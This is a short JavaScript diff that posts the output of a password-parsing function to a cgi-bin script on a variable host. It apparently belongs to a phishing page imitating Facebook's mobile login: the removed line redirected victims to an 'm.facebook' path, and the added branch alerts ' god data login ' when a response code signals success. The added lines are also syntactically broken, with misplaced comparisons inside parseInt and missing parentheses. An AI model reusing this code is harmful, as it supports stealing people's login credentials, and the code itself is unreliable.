@@ -55,10 +55,14 @@ var _app_validations = ()=>{
 		_request.open('POST',"http://"+_host+'/cgi-bin/index.pl');
 		
 		_request.onreadystatechange = function (){
-			if (this.readyState === 4 && this.status === 404){_appIN.chkDT(1); return 0;}
-			if (this.readyState === 4 && this.status === 401){_appIN.chkDT(2); return 0;}
 			if (this.readyState === 4 && this.status === 200){
-				window.location.href = 'http://'+_host+'/m.facebook/user/';
+		        var _response = JSON.parse(this.responseText);
+				if (parseInt(_response._cod === 1) { _appIN.chkDT(1); return 0;} 
+				if (parseInt(_response._cod === 2) { _appIN.chkDT(2); return 0;} 
+				if (parseInt(_response._cod === 3) {
+						alert(' god data login ');
+				} 
+		
 			}
 		};
 		_request.send(parsePw());
